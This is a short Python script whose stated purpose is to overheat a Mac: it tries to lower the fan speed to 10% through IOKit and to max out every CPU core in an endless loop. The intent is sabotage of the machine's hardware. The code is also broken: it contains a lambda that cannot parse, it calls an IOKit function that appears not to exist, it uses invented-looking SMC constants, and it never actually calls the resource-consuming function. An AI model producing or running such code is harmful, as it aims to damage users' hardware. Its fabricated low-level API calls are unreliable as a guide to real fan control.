import multiprocessing
import ctypes

# Constants for fan control
SMC_KEY_FAN_MIN_SPEED = 0x68
SMC_CMD_READ_KEYINFO = 0x5A
SMC_CMD_WRITE_BYTE = 0x99

def set_fan_speed(speed):
    # Use ctypes to access low-level system functions
    smc_handle = ctypes.CDLL("/System/Library/Frameworks/IOKit.framework/IOKit")
    
    # Retrieve fan key information
    key_info = ctypes.create_string_buffer(8)
    smc_handle.send_message(SMC_CMD_READ_KEYINFO, 0, key_info)
    
    # Set the fan speed
    fan_speed = int(speed * 255)  # Convert percentage to 0-255 range
    smc_handle.send_message(SMC_CMD_WRITE_BYTE, SMC_KEY_FAN_MIN_SPEED, fan_speed)
    
def consume_all_resources():
    while True:
        multiprocessing.Pool().map(lambda _: while True: pass, range(multiprocessing.cpu_count()))
# Main program
print("Prepare for some serious heat!")
set_fan_speed(0.1)  # Set fan speed to 10% of maximum
consume_all_resources
# Keep the program running to maintain minimum fan speed
while True:
    continue
